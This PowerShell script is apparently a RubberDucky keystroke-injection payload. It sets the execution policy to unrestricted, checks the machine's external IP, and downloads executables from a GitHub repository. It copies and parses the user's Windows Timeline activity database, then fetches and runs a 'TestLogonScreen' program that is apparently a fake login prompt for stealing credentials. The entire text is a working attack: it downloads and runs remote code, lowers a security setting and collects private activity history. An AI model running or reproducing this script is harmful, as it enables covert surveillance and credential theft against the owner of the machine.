Set-executionpolicy unrestricted -force -Scope currentuser
$workingfolder = "C:/PrivateData"
mkdir $workingfolder -ErrorAction SilentlyContinue
$proxy="http://127.0.0.1:9000"
try {
	$d=curl -usebasicparsing -proxy "$proxy" "https://ifconfig.me"
} catch { 
	Write-Host "Proxy port 9000 not working, trying direct..."
	$proxy=$null
	$d=curl -usebasicparsing -proxy $proxy "https://ifconfig.me"
	Write-Host "IP: $d"
}
if(-Not(test-path "$workingfolder/WxTCmd.exe"))
{
	curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/WxTCmd.exe" -outfile "$workingfolder/WxTCmd.exe"
}
$dbs = (gci "$($env:LOCALAPPDATA)\ConnectedDevicesPlatform" -recurse -Include 'ActivitiesCache.db').FullName 
if($dbs.count -eq 0)
{
	Write-Host "No activities found"
} else {
	cd "$workingfolder/"
	$dbs| foreach {
		cp "$_" "$workingfolder/"
		&"$workingfolder/WxTCmd.exe" -f "${workingfolder}/ActivitiesCache.db" --csv "$workingfolder"
	}
}
curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/PCActivity.pbit" -outfile "$workingfolder/PCActivity.pbit"
curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/TestLogonScreen.exe" -outfile "$workingfolder/logScreen.exe"
&"$workingfolder/logScreen.exe"
#&"$workingfolder/PCActivity.pbit"

